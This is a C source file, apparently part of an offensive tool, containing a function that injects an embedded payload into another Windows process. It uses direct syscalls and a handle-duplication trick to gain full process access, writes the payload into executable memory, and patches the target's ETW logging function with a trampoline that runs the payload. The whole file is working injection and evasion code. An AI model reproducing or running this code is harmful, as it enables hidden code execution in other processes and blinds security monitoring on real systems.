#include "injection.h"
#include "kueken.h"

BOOL InjectHook(PAPI pApi, DWORD dwPid) {

	BOOL bSuccess = FALSE;
	BYTE trampolin[] = { 0x48, 0xB8, 0xEF, 0xBE, 0xAD, 0xDE, 0x00, 0x00, 0x00, 0x00, 0x50, 0xC3 };
	CHAR cNtdll[] = {'n','t','d','l','l','.','d','l','l', 0x00};
	CHAR cNtdllPath[] = {'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l', 0x00};

	NTSTATUS status;
	DWORD cbNeeded = 0;
	DWORD64 offsetEtwEventWrite = 0;
	SIZE_T sizePayload = sizeof(kueken), ulOldProt = 0, ulOldOldProt = 0, ulSizeTrampolin = sizeof(trampolin);

	CHAR remoteModuleName[MAX_PATH] = { 0 };
	HMODULE hNtdll = NULL, hRemoteModules[1024] = { 0 };
	PVOID pEtwEventWrite = NULL, pRemoteEtwEventWrite = NULL, pRemoteEtwEventWriteSaved = NULL, pKuekenRemote = NULL;
	CLIENT_ID uPid = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes;

	HANDLE hLowPriv = NULL, hHighPriv = NULL, hDupPriv = NULL;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

	uPid.UniqueProcess = dwPid;
	uPid.UniqueThread = 0;

	pEtwEventWrite = GetFunctionPtr(H_LIB_NTDLL, H_API_ETWEVENTWRITE);
	if (pEtwEventWrite == NULL)
		goto exit;

	hNtdll = pApi->Kernel32.GetModuleHandleA(cNtdll);
	if (hNtdll == NULL)
		goto exit;

	offsetEtwEventWrite = (DWORD64)pEtwEventWrite - (DWORD64)hNtdll;

	PrepareSyscall(pApi->Nt.NtOpenProcess.dwSyscallNr, pApi->Nt.NtOpenProcess.pRecycledGate);
	status = DoSyscall(&hLowPriv, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttributes, &uPid);
	if (!NT_SUCCESS(status))
		goto exit;

	PrepareSyscall(pApi->Nt.NtDuplicateObject.dwSyscallNr, pApi->Nt.NtDuplicateObject.pRecycledGate);
	status = DoSyscall(NtCurrentProcess(), hLowPriv, NtCurrentProcess(), &hDupPriv, PROCESS_DUP_HANDLE, FALSE, 0);
	if (!NT_SUCCESS(status))
		goto exit;
	
	PrepareSyscall(pApi->Nt.NtDuplicateObject.dwSyscallNr, pApi->Nt.NtDuplicateObject.pRecycledGate);
	status = DoSyscall(hDupPriv, NtCurrentProcess(), NtCurrentProcess(), &hHighPriv, PROCESS_ALL_ACCESS, FALSE, 0);
	if (!NT_SUCCESS(status))
		goto exit;

	bSuccess = pApi->Psapi.EnumProcessModules(hHighPriv, hRemoteModules, sizeof(hRemoteModules), &cbNeeded);
	for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
		if (pApi->Psapi.GetModuleFileNameExA(hHighPriv, hRemoteModules[i], remoteModuleName, sizeof(remoteModuleName))) {
			if (pApi->Kernel32.lstrcmpA(cNtdllPath, toLowerA(remoteModuleName)) == 0) {
				pRemoteEtwEventWrite = (PBYTE)hRemoteModules[i] + offsetEtwEventWrite;
				break;
			}
		}
	}

	if(pRemoteEtwEventWrite == NULL)
		goto exit;
	pRemoteEtwEventWriteSaved = pRemoteEtwEventWrite;

	PrepareSyscall(pApi->Nt.NtAllocateVirtualMemory.dwSyscallNr, pApi->Nt.NtAllocateVirtualMemory.pRecycledGate);
	status = DoSyscall(hHighPriv, &pKuekenRemote, 0, (PULONG)&sizePayload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
		goto exit;

	PrepareSyscall(pApi->Nt.NtWriteVirtualMemory.dwSyscallNr, pApi->Nt.NtWriteVirtualMemory.pRecycledGate);
	status = DoSyscall(hHighPriv, pKuekenRemote, kueken, sizePayload, NULL);
	if (!NT_SUCCESS(status))
		goto exit;

	pApi->Kernel32._CopyMemory((PBYTE)trampolin + 2, &pKuekenRemote, sizeof(PVOID));

	PrepareSyscall(pApi->Nt.NtProtectVirtualMemory.dwSyscallNr, pApi->Nt.NtProtectVirtualMemory.pRecycledGate);
	status = DoSyscall(hHighPriv, &pRemoteEtwEventWrite, &ulSizeTrampolin, PAGE_EXECUTE_READWRITE, &ulOldProt);
	if (!NT_SUCCESS(status))
		goto exit;

	PrepareSyscall(pApi->Nt.NtWriteVirtualMemory.dwSyscallNr, pApi->Nt.NtWriteVirtualMemory.pRecycledGate);
	status = DoSyscall(hHighPriv, pRemoteEtwEventWriteSaved, trampolin, sizeof(trampolin), NULL);
	if (!NT_SUCCESS(status))
		goto exit;

	PrepareSyscall(pApi->Nt.NtProtectVirtualMemory.dwSyscallNr, pApi->Nt.NtProtectVirtualMemory.pRecycledGate);
	status = DoSyscall(hHighPriv, &pRemoteEtwEventWriteSaved, &ulSizeTrampolin, ulOldProt, &ulOldOldProt);
	if (!NT_SUCCESS(status))
		goto exit;

	bSuccess = TRUE;

exit:

	if (hLowPriv)
		pApi->Kernel32.CloseHandle(hLowPriv);

	if (hHighPriv)
		pApi->Kernel32.CloseHandle(hHighPriv);

	if (hDupPriv)
		pApi->Kernel32.CloseHandle(hDupPriv);

	return bSuccess;

}
